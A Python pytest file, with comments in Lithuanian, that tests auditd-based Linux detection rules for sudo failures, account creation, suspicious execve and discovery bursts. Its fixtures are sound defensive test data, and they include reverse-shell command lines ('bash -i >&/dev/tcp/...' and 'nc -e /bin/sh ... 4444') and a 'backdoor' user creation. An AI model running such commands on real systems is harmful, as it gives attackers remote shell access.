"""
Linux endpoint (auditd) taisyklių testai: parseris ir kiekviena taisyklė.
"""
from __future__ import annotations

import datetime
import re

import pytest

import attack_catalog
from common import Selectors
from linux_rules import _RULE_TYPES_FILTER, LinuxEndpointRuleDetector, parse_audit

T0 = datetime.datetime(2022, 1, 24, 4, 40, tzinfo=datetime.timezone.utc)


class FakeLoki:
    def __init__(self, lines: list[str], host: str = "lab-linux", job: str = "linux_endpoint"):
        self._lines = [{"timestamp": "0", "line": ln, "labels": {"host": host, "job": job}}
                       for ln in lines]

    def query_range(self, query, start=None, end=None, limit=5000):
        return self._lines[:limit]


def _check(lines, **kw):
    return LinuxEndpointRuleDetector(FakeLoki(lines)).check(now=T0, **kw)


# -- Parser ------------------------------------------------------------------

def test_parse_execve_joins_args():
    ev = parse_audit('type=EXECVE msg=audit(1699.1:9): argc=2 a0="bash" a1="-i"')
    assert ev.type == "EXECVE" and ev.command == "bash -i"


def test_parse_quoted_fields():
    ev = parse_audit('type=ADD_USER msg=audit(1:2): acct="backdoor" exe="/usr/sbin/useradd" res=success')
    assert ev.fields["acct"] == "backdoor" and ev.fields["res"] == "success"


def test_parse_non_audit_line():
    assert parse_audit("just a plain log line") is None


# -- Sudo/su failures --------------------------------------------------------

def _sudo_fail(acct="root"):
    return f'type=USER_AUTH msg=audit(1:1): pid=1 uid=1000 acct="{acct}" exe="/usr/bin/sudo" res=failed'


def test_sudo_failures_threshold():
    a = _check([_sudo_fail() for _ in range(3)])
    assert a[0].alert_type == "linux_sudo_auth_failure"
    assert a[0].attack_techniques == ["T1548.003"]
    assert a[0].details["attempts"] == 3


def test_sudo_failures_below_threshold_silent():
    assert _check([_sudo_fail() for _ in range(2)]) == []


def test_successful_sudo_ignored():
    ok = 'type=USER_AUTH msg=audit(1:1): acct="root" exe="/usr/bin/sudo" res=success'
    assert _check([ok, ok, ok]) == []


# -- Account creation --------------------------------------------------------

def test_account_created():
    line = 'type=ADD_USER msg=audit(1:2): acct="backdoor" exe="/usr/sbin/useradd" res=success'
    a = _check([line])
    assert a[0].alert_type == "linux_account_created"
    assert a[0].attack_techniques == ["T1136.001"]


# -- Suspicious execve -------------------------------------------------------

def test_reverse_shell_detected():
    line = 'type=EXECVE msg=audit(1:3): argc=3 a0="bash" a1="-i" a2=">&/dev/tcp/10.0.0.1/4444"'
    a = _check([line])
    assert any(x.alert_type == "linux_suspicious_execve" for x in a)
    assert "T1059.004" in next(x for x in a if x.alert_type == "linux_suspicious_execve").attack_techniques


def test_benign_execve_ignored():
    line = 'type=EXECVE msg=audit(1:3): argc=2 a0="ls" a1="-la"'
    assert _check([line]) == []


def _execve(*args: str) -> str:
    return "type=EXECVE msg=audit(1:3): argc={} {}".format(
        len(args), " ".join(f'a{i}="{a}"' for i, a in enumerate(args)))


@pytest.mark.parametrize("args", [
    ("ssh", "-i", "/home/ops/.ssh/id_ed25519", "backup@10.0.0.5"),
    ("rsync", "-e", "ssh", "-a", "/srv", "backup@10.0.0.5:/b"),
    ("sed", "-i", "s/^#Port/Port/", "/etc/ssh/sshd_config"),
    ("ls", "-i", "/usr/share"),
    ("grep", "-i", "error", "deploy.sh"),
])
def test_admin_commands_with_i_or_e_flags_not_suspicious(args):
    assert _check([_execve(*args)]) == []


@pytest.mark.parametrize("args", [
    ("/bin/bash", "-i"),
    ("sh", "-c", "id", "-i"),
    ("/usr/bin/nc", "-e", "/bin/sh", "10.0.0.9", "4444"),
])
def test_interactive_shell_and_nc_exec_detected(args):
    assert [a.alert_type for a in _check([_execve(*args)])] == ["linux_suspicious_execve"]


def test_query_reads_agent_and_syslog_paths_only_rule_record_types():
    class RecordingLoki(FakeLoki):
        def query_range(self, query, start=None, end=None, limit=5000):
            self.query = query
            return super().query_range(query, start, end, limit)

    loki = RecordingLoki([])
    LinuxEndpointRuleDetector(loki, Selectors(extra_matchers='dataset="lab"')).check(now=T0)
    assert loki.query.startswith('{job=~"linux_endpoint|syslog", dataset="lab"} ')
    assert loki.query.endswith('|~ "type=(USER_AUTH|USER_LOGIN|ADD_USER|USER_MGMT|EXECVE) "')


# -- Tikri auditd įrašai: audit.log ir persiųsti per rsyslog -> syslog-ng ------

# Userspace įrašai (PAM, shadow-utils) laukus apgaubia msg='...'; EXECVE yra branduolio įrašas be jo.
REAL_SUDO_FAILURE = (
    "type=USER_AUTH msg=audit(1729501234.567:812): pid=4242 uid=1000 auid=1000 ses=3 subj=unconfined "
    "msg='op=PAM:authentication grantors=? acct=\"root\" exe=\"/usr/bin/sudo\" hostname=web-01 "
    "addr=? terminal=/dev/pts/0 res=failed'")
REAL_ADD_USER = (
    "type=ADD_USER msg=audit(1729501300.101:830): pid=4300 uid=0 auid=1000 ses=3 subj=unconfined "
    "msg='op=add-user acct=\"backdoor\" exe=\"/usr/sbin/useradd\" hostname=web-01 addr=? "
    "terminal=pts/0 res=success'")
REAL_EXECVE = ('type=EXECVE msg=audit(1729501400.202:840): argc=5 a0="nc" a1="-e" a2="/bin/sh" '
               'a3="10.0.0.9" a4="4444"')


def _via_syslog(record: str) -> str:
    """Įrašas taip, kaip jį įrašo syslog-ng šablonas, gavęs iš auditd syslog įskiepio."""
    return f"2026-10-27T09:00:00+00:00 web-01 user.info audisp-syslog[812]: {record}"


ROUTES = [pytest.param("linux_endpoint", lambda record: record, id="audit.log"),
          pytest.param("syslog", _via_syslog, id="syslog")]


def _check_real(records, job, form):
    loki = FakeLoki([form(r) for r in records], host="web-01", job=job)
    return LinuxEndpointRuleDetector(loki).check(now=T0)


def test_parse_real_record_strips_msg_wrapper_quotes():
    ev = parse_audit(REAL_SUDO_FAILURE)
    assert ev.fields["res"] == "failed" and ev.fields["op"] == "PAM:authentication"
    assert ev.fields["acct"] == "root" and ev.fields["exe"] == "/usr/bin/sudo"


@pytest.mark.parametrize("job, form", ROUTES)
def test_real_sudo_failures_detected(job, form):
    alerts = _check_real([REAL_SUDO_FAILURE] * 3, job, form)
    assert [a.alert_type for a in alerts] == ["linux_sudo_auth_failure"]
    assert alerts[0].source_host == "web-01"
    assert alerts[0].details == {"attempts": 3, "account": "root"}


@pytest.mark.parametrize("job, form", ROUTES)
def test_real_account_creation_detected(job, form):
    alerts = _check_real([REAL_ADD_USER], job, form)
    assert [a.alert_type for a in alerts] == ["linux_account_created"]
    assert alerts[0].details["acct"] == "backdoor"


@pytest.mark.parametrize("job, form", ROUTES)
def test_real_execve_detected(job, form):
    alerts = _check_real([REAL_EXECVE], job, form)
    assert [a.alert_type for a in alerts] == ["linux_suspicious_execve"]
    assert alerts[0].details["command"] == "nc -e /bin/sh 10.0.0.9 4444"


@pytest.mark.parametrize("record", [REAL_SUDO_FAILURE, REAL_ADD_USER, REAL_EXECVE])
def test_type_filter_matches_records_after_syslog_header(record):
    pattern = re.fullmatch(r'\|~ "(.*)"', _RULE_TYPES_FILTER).group(1)
    assert re.search(pattern, record) and re.search(pattern, _via_syslog(record))


# -- Discovery burst ---------------------------------------------------------

def test_discovery_burst_detected():
    cmds = ["whoami", "id", "uname", "netstat"]
    lines = [f'type=EXECVE msg=audit(1:{i}): argc=1 a0="{c}"' for i, c in enumerate(cmds)]
    a = _check(lines)
    assert any(x.alert_type == "linux_discovery_burst" for x in a)


def test_discovery_burst_below_threshold_silent():
    lines = [f'type=EXECVE msg=audit(1:{i}): argc=1 a0="{c}"' for i, c in enumerate(["whoami", "id"])]
    assert [x for x in _check(lines) if x.alert_type == "linux_discovery_burst"] == []


# -- Katalogas ---------------------------------------------------------------

def test_linux_alert_types_in_catalog():
    for t in ("linux_sudo_auth_failure", "linux_account_created", "linux_suspicious_execve",
              "linux_discovery_burst"):
        assert attack_catalog.techniques_for(t), t
